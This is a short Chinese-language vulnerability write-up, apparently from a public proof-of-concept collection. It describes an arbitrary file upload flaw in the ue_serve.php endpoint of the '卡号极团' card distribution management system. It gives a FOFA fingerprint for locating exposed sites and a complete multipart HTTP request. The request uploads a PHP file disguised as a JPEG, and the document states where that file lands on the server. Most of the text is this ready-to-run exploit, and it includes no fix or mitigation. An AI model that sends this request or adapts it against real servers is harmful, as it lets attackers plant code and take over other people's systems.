# 卡号极团管理系统ue_serve存在任意文件上传漏洞

# 一、漏洞简介
号卡极团分销商城管理系统,同步对接多平台,同步订单信息,支持敢探号一键上架,卡号极团管理系统ue_serve存在任意文件上传漏洞，攻击者可通过该漏洞或服服务器权限。

# 二、影响版本
+ 卡号极团管理系统

# 三、资产测绘
+ fofa`icon_hash="-795291075"`
+ 特征


# 四、漏洞复现
```plain
POST /admin/controller/ue_serve.php?action=image&encode=utf-8 HTTP/2
Host: 
Cookie: PHPSESSID=ecq4ucplk5n6e3ipihvktl103r
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylkv1kpsZgzw2WC03
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 301

------WebKitFormBoundarylkv1kpsZgzw2WC03
Content-Disposition: form-data; name="name"

raw.php
------WebKitFormBoundarylkv1kpsZgzw2WC03
Content-Disposition: form-data; name="upfile"; filename="raw.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarylkv1kpsZgzw2WC03--
```


上传文件位置

```plain
/upload/660c0ab3990c5_raw.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zl0fb1pz9uc16fmg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
